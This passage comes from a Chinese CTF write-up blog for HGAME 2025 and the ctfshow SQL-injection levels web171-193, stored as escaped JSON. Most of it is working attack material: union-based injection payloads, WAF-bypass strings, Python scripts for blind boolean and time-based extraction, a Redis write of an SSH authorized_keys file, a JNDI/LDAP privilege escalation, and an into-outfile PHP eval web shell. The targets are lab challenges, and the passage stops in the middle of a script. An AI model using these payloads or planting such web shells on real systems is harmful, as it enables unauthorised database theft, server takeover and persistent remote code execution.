WriteH111Request(\u0026amp;buf, \u0026amp;http.Request{ 14\tMethod: \u0026#34;POST\u0026#34;, 15\tRequestURI: \u0026#34;/flag\u0026#34;, 16\t}) 17\tif err != nil { 18\tt.Fatalf(\u0026#34;expected no error, got %v\u0026#34;, err) 19\t} 20\tt.Log(len(buf.Bytes())) 21\tt.Log(hex.EncodeToString(buf.Bytes())) 22} 用WriteH111Request序列化一个POST /flag请求\n序列化后的十六进制数据\n0004504f535400052f666c616700000000 在这段数据后⾯补⻬0，补⻬到65536，产⽣Length溢出\npayload:\nGET / HTTP/1.1\rHost: node1.hgame.vidar.club:30529\r{{hexdec(0004504f535400052f666c616700000000)}}{{padding:zero(0|65519)}} Level 257 ⽇落的紫罗兰 题⽬端⼝为ssh服务和redis服务\n首先使用 ssh-keygen 生成密钥对\nssh-keygen -t rsa 把生成的公钥添加到 spaced_key.txt 文件里\n(echo -e “\\n\\n”; cat /root/.ssh/id_rsa.pub; echo -e “\\n\\n”) \u0026gt; spaced_key.txt 利用 Redis 服务写入 SSH 公钥\ncat spaced_key.txt |redis-cli -h node1.hgame.vidar.club -p 30428 -x set ssh_key\rredis-cli -h node1.hgame.vidar.club -p 30428 redis-cli -h node1.hgame.vidar.club -p 30428\rnode1.hgame.vidar.club:30428\u0026gt; config set dir /home/mysid/.ssh\rOK\rnode1.hgame.vidar.club:30428\u0026gt; config set dbfilename \u0026#34;authorized_keys\u0026#34;\rOK\rnode1.hgame.vidar.club:30428\u0026gt; save\rOK\rnode1.hgame.vidar.club:30428\u0026gt; exit user.txt里面有ssh的用户名\n连ssh\nssh -i /root/.ssh/id_rsa mysid@node1.hgame.vidar.club -p 31266 要提权\n这题用的是上传恶意ldap服务器利⽤本地java应⽤提权\n我咋知道本地有Java环境呢？find一下就好\nfind / -name \u0026#34;java\u0026#34; 2\u0026gt;/dev/null 上传恶意 JAR 包\nscp -i /root/.ssh/id_rsa -P 31266 ./JNDIMap-0.0.1.jar mysid@node1.hgame.vidar.club:/tmp /usr/local/openjdk-8/bin/java -jar /tmp/JNDIMap-0.0.1.jar -i 127.0.0.1 -l 389 -u \u0026#34;/Deserialize/Jackson/Command/Y2htb2QgNzc3IC9mbGFn\u0026#34; 触发漏洞\ncurl -X POST -d \u0026#34;baseDN=a/b\u0026amp;filter=a\u0026#34; http://127.0.0.1:8080/search 成功执行\n","permalink":"http://localhost:1313/post/hgame_2025/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003e拿到环境\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一个小游戏，猜测应该是js审计\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看index.js发现代码进行了混淆\u003c/p\u003e\n\u003cp\u003e可以用工具反混淆一下，增加一下可读性\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反混淆之后找到这个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025-Web-Writeup"},{"content":"无过滤注入（对输出内容进行过滤） web171 $sql = \u0026#34;select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; limit 1;\u0026#34;; flag是存在于username为flag的用户的数据中，我们只需要通过\n1\u0026#39; or 1=1 --+ 即可输出所有用户数据\nweb172 相比上一题，这题增加了过滤\n//检查结果是否有flag\rif($row-\u0026gt;username!==\u0026#39;flag\u0026#39;){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;;\r} 方法一: 联合查询\n因为联合查询只会显示password\napi/?id=1\u0026#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23\r/api/?id=1\u0026#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;ctfshow_web\u0026#39;),database()%23\r/api/?id=1\u0026#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;ctfshow_web\u0026#39; and table_name=\u0026#39;ctfshow_user\u0026#39;),database()%23\r//看到有3列 id,username,password\r/api/?id=1\u0026#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23\r//查询password发现没有flag\r//查另一个表 ctfshow_user2\r/api/?id=1\u0026#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23\r//看到flag 方法二: 将用户名字段进行编码，绕过检测\n-1\u0026#39; union select to_base64(username),password from ctfshow_user2 --+ 方法三: 只查询密码\n-1\u0026#39; union select id,password from ctfshow_user2 where username=\u0026#39;flag web173 过滤要求查询结果中不能出现flag字段\n//检查结果是否有flag\rif(!preg_match(\u0026#39;/flag/i\u0026#39;, json_encode($ret))){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;;\r} 方法一：联合查询\n和上题解法一样，只是这题flag在ctfshow_user3\n方法二：\n只查询password\n-1\u0026#39; union select id,id,password from ctfshow_user3 where username=\u0026#39;flag 方法三: 将用户名字段进行编码，绕过检测\n-1\u0026#39; union select to_base64(username),password from ctfshow_user3 --+ web174 输出时增加了过滤数字\n//检查结果是否有flag和数字\rif(!preg_match(\u0026#39;/flag|[0-9]/i\u0026#39;, json_encode($ret))){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;;\r} 由于flag中含有数字，哪怕像之前的通过to_base64等编码后，仍然不可避免数字的出现\n所以这题我们要用到布尔盲注\n放个脚本\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1\u0026#39; and \u0026#34; 5 6result = \u0026#39;\u0026#39; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 payload = f\u0026#39;1=if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))\u0026gt;{mid},1,0) -- -\u0026#39; 17 r = requests.get(url + payload) 18 if \u0026#34;admin\u0026#34; in r.text: 19 head = mid + 1 20 else: 21 tail = mid 22 23 if head != 32: 24 result += chr(head) 25 else: 26 break 27 print(result) 又或者通过replace方法将数字替换成其他的合法字符\n1\u0026#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,\u0026#39;A\u0026#39;),2,\u0026#39;B\u0026#39;),3,\u0026#39;C\u0026#39;),4,\u0026#39;D\u0026#39;),5,\u0026#39;E\u0026#39;),6,\u0026#39;F\u0026#39;),7,\u0026#39;G\u0026#39;),8,\u0026#39;H\u0026#39;),9,\u0026#39;I\u0026#39;),0,\u0026#39;J\u0026#39;),\u0026#39;b\u0026#39; from ctfshow_user4 where username=\u0026#39;flag\u0026#39; %23 拿到flag后替换回去就行\n1import base64 2 3flag64 = \u0026#34;ctfshow{GHIeaIeG-AGaG-DAab-HHae-eEaFcHFIEbef}\u0026#34; 4 5flag = flag64.replace(\u0026#34;A\u0026#34;, \u0026#34;1\u0026#34;).replace(\u0026#34;B\u0026#34;, \u0026#34;2\u0026#34;).replace(\u0026#34;C\u0026#34;, \u0026#34;3\u0026#34;).replace(\u0026#34;D\u0026#34;, \u0026#34;4\u0026#34;).replace(\u0026#34;E\u0026#34;, \u0026#34;5\u0026#34;).replace(\u0026#34;F\u0026#34;, \u0026#34;6\u0026#34;).replace(\u0026#34;G\u0026#34;, \u0026#34;7\u0026#34;).replace(\u0026#34;H\u0026#34;, \u0026#34;8\u0026#34;).replace(\u0026#34;I\u0026#34;, \u0026#34;9\u0026#34;).replace(\u0026#34;J\u0026#34;, \u0026#34;0\u0026#34;) 6 7print(flag) 又或者\n1\u0026#39; union select 1,\u0026#34;\u0026lt;?=eval($_POST[1]);?\u0026gt;\u0026#34; into outfile \u0026#34;/var/www/html/shell.php\u0026#34; --+ web175 //检查结果是否有flag\rif(!preg_match(\u0026#39;/[\\x00-\\x7f]/i\u0026#39;, json_encode($ret))){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;;\r}\r检查变量 $ret 经过 json_encode 编码后的结果中是否只包含 ASCII 字符（即字符编码范围在 \\x00 到 \\x7f 之间）。如果不满足这个条件，就将 $ret 数组中的 msg 键的值设置为 '查询成功'。\n也就是没有任何回显\n方法一：时间盲注\n大佬的脚本，用的二分法\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1\u0026#39; and \u0026#34; 5 6result = \u0026#39;\u0026#39; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 payload = f\u0026#39;1=if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))\u0026gt;{mid},sleep(2),0) -- -\u0026#39; 17 try: 18 r = requests.get(url + payload, timeout=0.5) 19 tail = mid 20 except Exception as e: 21 head = mid + 1 22 23 if head != 32: 24 result += chr(head) 25 else: 26 break 27 print(result) 方法二:利用读写文件写入网站根目录 http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/api/v5.php?id=1' union select 1,password from ctfshow_user5 into outfile \u0026lsquo;/var/www/html/1.txt\u0026rsquo;\u0026ndash;+\u0026amp;page=1\u0026amp;limit=10 之后访问http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/1.txt\n过滤注入（对传入参数进行过滤） web176 //对传入的参数进行了过滤\rfunction waf($str){\r//代码过于简单，不宜展示\r} 方法一：万能钥匙\n1\u0026#39; or 1=1--+ 能找到flag\n方法二:大小写绕过\n1\u0026#39; uNion sElect 1,2,password from ctfshow_user --+ web177 黑名单：空格、+\n空格替代：%20（普通空格）、%09（水平制表符）、%0a（换行符）、%0b（回车符）、%0c（新一页）、%0d（垂直制表符）、%a0、()、``、\\**\\\n可以用\\**\\绕过\n1\u0026#39;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=\u0026#39;flag\u0026#39;%23 方法二:万能钥匙\nweb178 黑名单增加：%20、*\n1\u0026#39;%09union%09select%09password,1,1%09from%09ctfshow_user%09where%09username%09=\u0026#39;flag\u0026#39;%23 方法二:万能钥匙\nweb179 黑名单增加：%09、%0a、%0b、%0d\n这题把%09也过滤了，这题空格可以用%0c绕过\n1\u0026#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23 web180 黑名单增加：#\n可以用\u0026ndash;%0c代替#(%23)\n1\u0026#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c 或者直接万能密码\nid=-1\u0026#39;or(id=26)and\u0026#39;1\u0026#39;=\u0026#39;1 web181 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i\u0026#39;, $str); 4 } / 和 /i：正则表达式的定界符，/ 表示正则表达式的开始和结束，i 是修饰符，表示不区分大小写进行匹配。\n|\\*：匹配空格字符（）和星号（*），这两个字符在 SQL 注入中可能会被用于构造恶意语句。\n\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0\n：分别匹配不同的 ASCII 控制字符和特殊空白字符，例如：\n\\x09：水平制表符（Tab） \\x0a：换行符（LF） \\x0b：垂直制表符 \\x0c：换页符 \\x00：空字符 \\x0d：回车符（CR） \\xa0：不间断空格 \\x23|\\#：匹配井号（#），在 SQL 中，# 通常用于注释，攻击者可能会利用注释来绕过 SQL 语句的检查。\nfile|into|select：匹配关键字 file、into 和 select，这些关键字在 SQL 注入和文件包含攻击中经常被使用。\n方法一 用like来匹配关键词flag\n-1\u0026#39;%0cor%0cusername%0clike%0c\u0026#39;flag 方法二\n-1\u0026#39;or(id=26)and\u0026#39;1 看到一篇大佬的文章，感觉明了不少\nctfshow Web入门SQL注入 web171-197 Writeup - X1r0z Blog\nweb182 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select|flag/i\u0026#39;, $str); 4 } 黑名单增加：flag\n这题可以用到like进行模糊查询\npayload:\n-1\u0026#39;or%0cusername%0clike%0c\u0026#39;fl% 或者继续使用上一题的方法二\nweb183 查询语句\n//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select count(pass) from \u0026#34;.$_POST[\u0026#39;tableName\u0026#39;].\u0026#34;;\u0026#34;; 返回逻辑\n//对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i\u0026#39;, $str);\r} 查询结果\n//返回用户表的记录总数\r$user_count = 0; 题目大概的意思就是我们传入表名进行查询，如果表名正确，就会返回用户表记录总数1，如果表名错误则返回0，且每次最多只会返回1，根据这个我们可以尝试布尔盲注，如果我们知道表名(ctfshow_user)和列名(pass)，我们就能通过布尔盲注拿到flag\nY4tacker大佬的脚本\nimport requests\rurl = \u0026#39;http://ee0ad3ab-e8f0-4183-97a8-aa3c5bcbe4f4.challenge.ctf.show/select-waf.php\u0026#39;\rstr = r\u0026#34;{abcdefghijklmnopqrstuvwsyz-0123456789}\u0026#34;\rflag = \u0026#34;\u0026#34;\rindex = 0\rwhile True:\rfor i in str:\rdata = {\r\u0026#39;tableName\u0026#39;: f\u0026#34;(ctfshow_user)where(substr(pass,{index},1))regexp(\u0026#39;{i}\u0026#39;)\u0026#34;\r}\rr = requests.post(url, data=data)\rif r.text.find(\u0026#34;$user_count = 1;\u0026#34;) \u0026gt; 0:\rflag += i\rprint(flag)\rbreak\rindex += 1 不是为什么我flag的马甲是这样的\nweb184 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str); 4 } 因为这题where被ban了，我们可以利用right join进行代替\n依旧是布尔盲注\nPOC\nimport requests\rurl = \u0026#39;http://effed757-6639-46a9-9103-22fedb04bb41.challenge.ctf.show/select-waf.php\u0026#39;\rcharset = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}\u0026#39;\rflag = \u0026#39;\u0026#39;\rfor i in range(1, 50): # 假设 flag 最长 50 个字符\rfor j in charset:\rpayload = f\u0026#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1) regexp char({ord(j)}))\u0026#34;\rdata = {\r\u0026#39;tableName\u0026#39;: payload\r}\rresponse = requests.post(url, data=data)\rif \u0026#34;some_success_condition\u0026#34; in response.text:\rflag += j\rprint(flag)\rbreak web185 //对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str);\r} 这题把数字ban掉了\n这其实就导致了我们在构造payload的时候没办法直接使用数字\n但是我们可以用true来代替构造出数字\n我们知道true = 1\n那2就可以用true+true来表示，以此类推\n1import requests 2url = \u0026#34;http://33578c7b-f34a-422b-87a5-a8accac68645.challenge.ctf.show/select-waf.php\u0026#34; 3flag = \u0026#39;\u0026#39; 4 5 6def createNum(n): 7 num = \u0026#39;true\u0026#39; 8 if n == 1: 9 return \u0026#39;true\u0026#39; 10 else: 11 for i in range(n - 1): 12 num += \u0026#34;+true\u0026#34; 13 return num 14 15 16for i in range(45): 17 if i \u0026lt;= 5: 18 continue 19 for j in range(127): 20 data = { 21 \u0026#34;tableName\u0026#34;: f\u0026#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{createNum(i)},{createNum(1)})regexp(char({createNum(j)})))\u0026#34; 22 } 23 r = requests.post(url, data=data) 24 if r.text.find(\u0026#34;$user_count = 43;\u0026#34;) \u0026gt; 0: 25 if chr(j) != \u0026#34;.\u0026#34;: 26 flag += chr(j) 27 28 print(\u0026#34;[*]result is:\u0026#34;+flag.lower()) 29 if chr(j) == \u0026#34;}\u0026#34;: 30 exit(0) 31 break web186 //对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\\u0026lt;|\\\u0026gt;|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str);\r} 解法和上题一样\nweb187 返回逻辑\r$username = $_POST[\u0026#39;username\u0026#39;];\r$password = md5($_POST[\u0026#39;password\u0026#39;],true);\r//只有admin可以获得flag\rif($username!=\u0026#39;admin\u0026#39;){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名不存在\u0026#39;;\rdie(json_encode($ret));\r}\rpassword=md5($pass,true)绕过、弱类型、MD5强碰撞_select * from \u0026lsquo;admin\u0026rsquo; where password=md5($pass,tru-CSDN博客\npayload:\nadmin/ffifdyop 抓个包\nweb188 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select pass from ctfshow_user where username = {$username}\u0026#34;; 返回逻辑\r//用户名检测\rif(preg_match(\u0026#39;/and|or|select|from|where|union|join|sleep|benchmark|,|\\(|\\)|\\\u0026#39;|\\\u0026#34;/i\u0026#39;, $username)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;;\rdie(json_encode($ret));\r}\r//密码检测\rif(!is_numeric($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;;\rdie(json_encode($ret));\r}\r//密码判断\rif($row[\u0026#39;pass\u0026#39;]==intval($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;;\rarray_push($ret[\u0026#39;data\u0026#39;], array(\u0026#39;flag\u0026#39;=\u0026gt;$flag));\r}\rctfshow-sql注入-超详解(172-200)_ctfshow 172-CSDN博客\n所以payload为\n0/0\r或者\r1||1/0 https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v\nweb189 //拼接sql语句查找指定ID用户\r$sql = \u0026#34;select pass from ctfshow_user where username = {$username}\u0026#34;; //用户名检测\rif(preg_match(\u0026#39;/select|and| |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleep|benchmark/i\u0026#39;, $username)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;;\rdie(json_encode($ret));\r}\r//密码检测\rif(!is_numeric($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;;\rdie(json_encode($ret));\r}\r//密码判断\rif($row[\u0026#39;pass\u0026#39;]==$password){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;;\r}\r这题在输入0/0的时候会显示密码错误，而在输入1/0的时候则会显示查询错误\n可以通过这个来进行布尔盲注，即正确时系统返回查询错误，错误时系统返回密码错误\n1# -*- coding: utf-8 -*- 2# @Author : Yn8rt 3# @Time : 2021/7/30 15:48 4# @Function: 5import requests 6import sys 7import json 8 9url = \u0026#39;http://98e1809d-5de9-4f68-b45f-d03388b1dae8.challenge.ctf.show/api/\u0026#39; 10flag = \u0026#39;ctfshow{\u0026#39; 11letter = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyz-{}\u0026#39; 12 13for i in range(100): 14 for j in letter: 15 payload = { 16 \u0026#34;username\u0026#34;: \u0026#34;if(load_file(\u0026#39;/var/www/html/api/index.php\u0026#39;)regexp(\u0026#39;{}\u0026#39;),0,1)\u0026#34;.format(flag + j), 17 \u0026#34;password\u0026#34;: \u0026#34;0\u0026#34; 18 19 } 20 r = requests.post(url=url,data=payload) 21 #print(r) 22 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 23 flag += j 24 print(flag) 25 break 26 if \u0026#39;}\u0026#39; in flag: 27 sys.exit() web190 查询语句\n//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;;\r返回逻辑\n//密码检测\rif(!is_numeric($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;;\rdie(json_encode($ret));\r}\r//密码判断\rif($row[\u0026#39;pass\u0026#39;]==$password){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;;\r}\r//TODO:感觉少了个啥，奇怪\r所以这题依旧可以进行布尔盲注\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://eb2e57dd-6c44-4140-9052-f549f647caa9.challenge.ctf.show/api/\u0026#34; 5 6result = \u0026#34;\u0026#34; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # 查数据库 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查字段 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 20 # 查flag 21 payload = \u0026#34;select group_concat(f1ag) from ctfshow_fl0g\u0026#34; 22 data = { 23 \u0026#39;username\u0026#39;: f\u0026#34;admin\u0026#39; and if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},1,2)=\u0026#39;1\u0026#34;, 24 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 27 r = requests.post(url,data=data) 28 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 29 head = mid + 1 30 else: 31 tail = mid 32 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web191 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 这题和上题一样，只是加了点ban掉了ascii\n我们用ord代替ascii即可\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://92a52ee7-65ff-4fff-b3d9-ec90f74fd2f5.challenge.ctf.show/api/\u0026#34; 5 6result = \u0026#34;\u0026#34; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # 查数据库 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查字段 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 20 # 查flag 21 payload = \u0026#34;select group_concat(f1ag) from ctfshow_fl0g\u0026#34; 22 data = { 23 \u0026#39;username\u0026#39;: f\u0026#34;admin\u0026#39; and if(ord(substr(({payload}),{i},1))\u0026gt;{mid},1,2)=\u0026#39;1\u0026#34;, 24 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 27 r = requests.post(url,data=data) 28 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 29 head = mid + 1 30 else: 31 tail = mid 32 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web192 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 不给我转是吧，那我不转了\n1import requests 2import string 3 4url = \u0026#34;http://20b20943-6b5a-464b-b13e-99ab8e2644b7.challenge.ctf.show/api/\u0026#34; 5flagstr=\u0026#34; _{}-\u0026#34; + string.ascii_lowercase + string.digits 6flag = \u0026#39;\u0026#39; 7for i in range(1,45): 8 for j in flagstr: 9 payload = f\u0026#34;admin\u0026#39; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)regexp(\u0026#39;{j}\u0026#39;),1,2)=\u0026#39;1\u0026#34; 10 data = { 11 \u0026#39;username\u0026#39;: payload, 12 \u0026#39;password\u0026#39;: \u0026#39;1\u0026#39; 13 } 14 r = requests.post(url, data=data) 15 if \u0026#34;密码错误\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 16 flag += j 17 print(flag) 18 if \u0026#34;}\u0026#34; in flag: 19 exit(0) 20 break 其实也差不多\n二分法脚本\n1 2# 用了二分法 dejavu~~~ 3import requests 4 5url = \u0026#34;http://c9b03201-bcdf-42ce-ac5b-c546603c1848.challenge.ctf.show:8080/api/\u0026#34; 6# 表名 CtFsHOw{FL0G,CtFsHOw{usEr 7# payload = \u0026#34;0\u0026#39; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 8# 列名 ID,F1AG,ID,usErNAME,pAss 9# payload = \u0026#34;0\u0026#39; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 10# flag 11payload = \u0026#34;0\u0026#39; or if(substr((select f1ag from ctfshow_fl0g),{},1)\u0026gt;\u0026#39;{}\u0026#39;,1,0) -- \u0026#34; 12true_flag = \u0026#34;\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\u0026#34; 13result = \u0026#34;\u0026#34; 14index = 1 15while True: 16 start = 32 17 end = 127 18 while not (abs(start-end) == 1 or start == end): 19 p = (start + end) // 2 20 data = { 21 \u0026#34;username\u0026#34;: payload.format(index, chr(p)), 22 \u0026#34;password\u0026#34;: 0 23 } 24 response = None 25 while True: 26 try: 27 response = requests.post(url, data=data) 28 except: 29 continue 30 break 31 if true_flag in response.text: 32 start = p 33 else: 34 end = p 35 if end \u0026lt; start: 36 end = start 37 result += chr(end) 38 print(f\u0026#34;[*] result: {result}\u0026#34;) 39 index += 1 web193 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex|substr/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 新增waf：substr\n没办法进行截断，但其实问题不大\n1import requests 2import sys 3url = \u0026#39;http://a4ac8172-cadd-42ca-a986-771b4ab0400f.challenge.ctf.show/api/\u0026#39; 4result = \u0026#39;\u0026#39; 5letter = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyz-_,{}\u0026#39; 6 7for i in range(100): 8 for j in letter: 9 # 查表 10 # payload = \u0026#34;select group_concat(table_name) from 